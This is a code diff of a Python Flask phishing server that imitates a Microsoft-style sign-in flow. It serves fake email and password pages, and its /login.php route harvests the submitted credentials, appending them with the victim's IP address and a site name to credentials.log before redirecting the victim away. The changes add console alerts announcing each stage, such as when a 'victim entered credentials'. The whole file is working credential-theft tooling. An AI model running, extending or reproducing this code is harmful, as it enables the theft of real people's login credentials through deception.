@@ -1,43 +1,54 @@
 from flask import Flask, request, render_template, send_file, redirect
+from threading import Thread
+from colorama import Fore
 from sys import argv
+import sys
+import colorama
+import logging
 import os
 
-app = Flask(__name__)
-
-
+#### Variables
 redirect_url = argv[1]
 host = argv[2]
 port = int(argv[3])
+sitename = argv[4]
+display_reqs = argv[5]
 
-def address(): #use our own function just in case the flask server is being hosted behind a proxy
-    """
-    This shouldn't be used for ratelimiting or actual tracking via ip addresses
-    these request headers can easily be spoofed and I am adding it mainly as a simple way to get addresses behind a proxy
-    tested with Nginx on ubuntu (not familiar with ngrox so someone else can adjust this function for that)
-    """
-    if request.headers.getlist('X-Forwarded-For'):
-        return request.headers.getlist('X-Forwarded-For')[0]
-    else:
-        return request.remote_addr
+#### Config
+app = Flask(__name__)
+logging.getLogger('werkzeug').disabled = True if display_reqs != "y" else None
+sys.modules['flask.cli'].show_server_banner = lambda *x: None
+colorama.init(autoreset=True)
 
+
+print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to to to the link...")
+## Ip logging warning:
+# This shouldn't be used for ratelimiting or actual tracking via ip addresses
+# these request headers can easily be spoofed and but is a simple way to get addresses behind a proxy
 
 @app.route("/")
 def email():
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found: " + Fore.CYAN + request.headers.get('X-Forwarded-For'))
+    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
+    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...")
     return render_template("email.html")
 
 
 @app.route("/", methods=["POST"])
 def passwd():
-    data = request.form.to_dict(flat=False)
-    return render_template("password.html", email=data["loginfmt"][0])
+    print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Victim entered email... Waiting for password...")
+    return render_template("password.html", email=request.form.to_dict(flat=False)["loginfmt"][0])
 
 
-@app.route("/login.php", methods=["POST", "GET"])
-def grabcreds():
-    data = request.form.to_dict(flat=False)
-    with open("credentials.log", "a") as file:
-        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]} : {address()} \n")
-    return redirect(redirect_url)
+@app.route("/login.php", methods=["POST"])
+def getcreds():
+    creds = request.form.to_dict(flat=False)
+    with open("credentials.log" , "a") as file:
+        print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Victim entered credentials!")
+        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + f"{list(creds.keys())[0]}", "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + f"{creds[list(creds.keys())[0]][0]}")
+        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
+        file.write(f"{list(creds.keys())[0]} : {creds[list(creds.keys())[0]][0]} : {request.headers.get('X-Forwarded-For')} : {sitename}\n")
+        return redirect(redirect_url)
 
 
 
